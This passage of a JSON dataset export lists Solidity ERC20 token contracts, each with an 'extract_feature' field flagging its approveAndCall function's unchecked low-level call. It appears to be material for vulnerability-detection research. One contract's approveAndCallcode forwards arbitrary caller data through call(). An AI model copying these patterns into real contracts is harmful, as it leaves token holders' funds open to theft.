  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BWCOINToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BWCOINToken() {\n balances[msg.sender] = 25 * 1000000 * 10000;\n totalSupply = 25 * 1000000 * 10000;\n name = \"BWCOIN\";\n decimals = 4;\n symbol = \"BWC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c0"
  },
  "filename": "32671.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BWCOINToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BWCOINToken() {\n balances[msg.sender] = 25 * 1000000;\n totalSupply = 25 * 1000000;\n name = \"BWCOIN Token\";\n decimals = 4;\n symbol = \"BWC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c1"
  },
  "filename": "32716.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"Feisty Phish Votes\";\n decimals = 8;\n symbol = \"FPV\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c2"
  },
  "filename": "32717.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n function totalSupply() constant returns (uint256 supply);\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n function mint(address _to, uint256 _amount) public returns (bool);\n function setEndMintDate(uint256 endDate) public;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function inc(uint256 a) internal constant returns (uint256) {\n return add(a,1);\n }\n function onePercent(uint256 a) internal constant returns (uint256){\n return div(a,uint256(100));\n }\n function power(uint256 a,uint256 b) internal constant returns (uint256){\n return mul(a,10**b);\n }\n}\ncontract StandardToken is Token {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n using SafeMath for uint256;\n uint8 public decimals;\n uint256 endMintDate;\n address owner;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) minter;\n uint256 public _totalSupply;\n modifier onlyOwner() {\n require(msg.sender==owner);\n _;\n }\n modifier canMint() {\n require(endMintDate>now && minter[msg.sender]);\n _;\n }\n modifier canTransfer() {\n require(endMintDate<now);\n _;\n }\n function transfer(address _to, uint256 _value) canTransfer returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0 && _to!=0x0) {\n return doTransfer(msg.sender,_to,_value);\n } else { return false; }\n }\n function doTransfer(address _from,address _to,uint256 _value) internal returns (bool success) {\n balances[_from] =balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) canTransfer returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0 && _to!=0x0 ) {\n doTransfer(_from,_to,_value);\n allowed[_from][msg.sender] =allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function totalSupply() constant returns (uint totalSupply){\n return _totalSupply;\n }\n function mint(address _to, uint256 _amount) canMint public returns (bool) {\n _totalSupply = _totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(0x0, _to, _amount);\n return true;\n }\n function setMinter(address _address,bool _canMint) onlyOwner public {\n minter[_address]=_canMint;\n }\n function setEndMintDate(uint256 endDate) public{\n endMintDate=endDate;\n }\n}\ncontract GMCToken is StandardToken {\n struct GiftData {\n address from;\n uint256 value;\n string message;\n }\n function () {\n revert();\n }\n string public name;\n string public symbol;\n string public version = 'H1.0';\n mapping (address => mapping (uint256 => GiftData)) private gifts;\n mapping (address => uint256 ) private giftsCounter;\n function GMCToken(address _wallet) {\n uint256 initialSupply = 2000000;\n endMintDate=now+4 weeks;\n owner=msg.sender;\n minter[_wallet]=true;\n minter[msg.sender]=true;\n mint(_wallet,initialSupply.div(2));\n mint(msg.sender,initialSupply.div(2));\n name = \"Good Mood Coin\";\n decimals = 4;\n symbol = \"GMC\";\n }\n function sendGift(address _to,uint256 _value,string _msg) payable public returns (bool success){\n uint256 counter=giftsCounter[_to];\n gifts[_to][counter]=(GiftData({\n from:msg.sender,\n value:_value,\n message:_msg\n }));\n giftsCounter[_to]=giftsCounter[_to].inc();\n return doTransfer(msg.sender,_to,_value);\n }\n function getGiftsCounter() public constant returns (uint256 count){\n return giftsCounter[msg.sender];\n }\n function getGift(uint256 index) public constant returns (address from,uint256 value,string message){\n GiftData data=gifts[msg.sender][index];\n return (data.from,data.value,data.message);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c3"
  },
  "filename": "32741.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract SMART is StandardToken {\n function () public payable {\n require(msg.value > 0 && receivedWei < targetWei);\n require(now > releaseTime);\n receivedWei += msg.value;\n walletAddress.transfer(msg.value);\n NewSale(msg.sender, msg.value);\n assert(receivedWei >= msg.value);\n }\n string public name = \"SmartMesh Token\";\n uint8 public decimals = 18;\n string public symbol = \"SMART\";\n string public version = 'v0.1';\n address public founder;\n uint256 public targetWei;\n uint256 public receivedWei;\n uint256 public releaseTime;\n uint256 public allocateEndTime;\n address public walletAddress;\n event NewSale(address indexed _from, uint256 _amount);\n mapping(address => uint256) nonces;\n function SMART(address _walletAddress) public {\n founder = msg.sender;\n walletAddress = _walletAddress;\n releaseTime = 1511917200;\n allocateEndTime = releaseTime + 37 days;\n targetWei = 3900 ether;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmart,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool){\n if(balances[_from] < _feeSmart + _value) revert();\n uint256 nonce = nonces[_from];\n bytes32 h = keccak256(_from,_to,_value,_feeSmart,nonce);\n if(_from != ecrecover(h,_v,_r,_s)) revert();\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _feeSmart < balances[msg.sender]) revert();\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _feeSmart;\n Transfer(_from, msg.sender, _feeSmart);\n balances[_from] -= _value + _feeSmart;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {\n uint256 nonce = nonces[_from];\n bytes32 hash = keccak256(_from,_spender,_value,nonce);\n if(_from != ecrecover(hash,_v,_r,_s)) revert();\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) public constant returns (uint256){\n return nonces[_addr];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { revert(); }\n return true;\n }\n function allocateTokens(address[] _owners, uint256[] _values) public {\n if(msg.sender != founder) revert();\n if(allocateEndTime < now) revert();\n if(_owners.length != _values.length) revert();\n for(uint256 i = 0; i < _owners.length ; i++){\n address owner = _owners[i];\n uint256 value = _values[i];\n if(totalSupply + value <= totalSupply || balances[owner] + value <= balances[owner]) revert();\n totalSupply += value;\n balances[owner] += value;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c4"
  },
  "filename": "32742.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Owned {\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n address public owner;\n function Owned() {\n owner = msg.sender;\n }\n address newOwner=0x0;\n event OwnerUpdate(address _prevOwner, address _newOwner);\n function changeOwner(address _newOwner) public onlyOwner {\n require(_newOwner != owner);\n newOwner = _newOwner;\n }\n function acceptOwnership() public{\n require(msg.sender == newOwner);\n OwnerUpdate(owner, newOwner);\n owner = newOwner;\n newOwner = 0x0;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Controlled is Owned{\n function Controlled() {\n setExclude(msg.sender);\n }\n bool public transferEnabled = false;\n bool lockFlag=true;\n mapping(address => bool) locked;\n mapping(address => bool) exclude;\n function enableTransfer(bool _enable)\n public onlyOwner{\n transferEnabled=_enable;\n }\n function disableLock(bool _enable)\n onlyOwner\n returns (bool success){\n lockFlag=_enable;\n return true;\n }\n function addLock(address _addr)\n onlyOwner\n returns (bool success){\n require(_addr!=msg.sender);\n locked[_addr]=true;\n return true;\n }\n function setExclude(address _addr)\n onlyOwner\n returns (bool success){\n exclude[_addr]=true;\n return true;\n }\n function removeLock(address _addr)\n onlyOwner\n returns (bool success){\n locked[_addr]=false;\n return true;\n }\n modifier transferAllowed {\n if (!exclude[msg.sender]) {\n assert(transferEnabled);\n if(lockFlag){\n assert(!locked[msg.sender]);\n }\n }\n _;\n }\n}\ncontract StandardToken is Token,Controlled {\n function transfer(address _to, uint256 _value) transferAllowed returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) transferAllowed returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken() {\n totalSupply = 400000000 * (10 ** 18);\n balances[msg.sender] = totalSupply;\n name = \"OneRoot Network Token\";\n decimals = 18;\n symbol = \"RNT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c5"
  },
  "filename": "32763.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract VirtualEstate is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function VirtualEstate(\n ) {\n balances[msg.sender] = 510000000000000;\n totalSupply = 510000000000000;\n name = \"VirtualEstate\";\n decimals = 0;\n symbol = \"VRE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c6"
  },
  "filename": "32773.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Etrusco is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Etrusco(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Etrusco Coin\";\n decimals = 18;\n symbol = \"EUS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c7"
  },
  "filename": "32774.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ProToken is StandardToken {\n function () {\n revert();\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'PRO1.0';\n function ProToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb14c8"
  },
  "filename": "32781.sol",
